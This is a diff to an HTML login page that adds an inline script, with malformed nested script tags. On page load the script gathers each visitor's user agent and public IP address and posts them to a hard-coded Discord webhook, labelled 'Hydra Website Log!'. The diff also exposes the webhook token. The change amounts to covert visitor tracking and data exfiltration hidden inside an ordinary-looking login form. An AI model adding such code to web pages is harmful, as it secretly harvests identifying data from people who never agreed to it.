@@ -28,6 +28,50 @@
         <input type="submit" value="Login">
     </form>
 
+	<script>
+		<script>
+    // JavaScript code to collect user information and send it to a Discord webhook
+    const userAgent = navigator.userAgent;
+    const ipAddressURL = 'https://api.ipify.org?format=json';
+    let ipAddress;
+
+    fetch(ipAddressURL)
+      .then(response => response.json())
+      .then(data => {
+        ipAddress = data.ip;
+
+        
+
+        // Create the embed object with collected information
+        const embed = {
+          title: 'Hydra Website Log!',
+          color: 0x00ff00,
+          fields: [
+            { name: 'User Agent', value: userAgent },
+            { name: 'IP Address', value: ipAddress }
+          ],
+          timestamp: new Date().toISOString()
+        };
+
+        const webhookURL = 'https://discord.com/api/webhooks/1186285222577320027/RyX-S-fJLdy1XGDbEdVJy_fOZ5lI34JFuhICK4lrRKwMEVfdCkrWc_qtdG_xQ4u7SKr8'; // Replace with your Discord webhook URL
+
+        // Send the embed to the Discord webhook
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ embeds: [embed] })
+        })
+        .then(response => console.log('Information sent to Discord webhook:', response))
+        .catch(error => console.error('Error sending information to Discord:', error));
+      })
+      .catch(error => {
+        console.error('Error collecting user information:', error);
+      });
+  </script>
+	</script>
+	
     <script src="script.js"></script>	
   </body>
 </html>
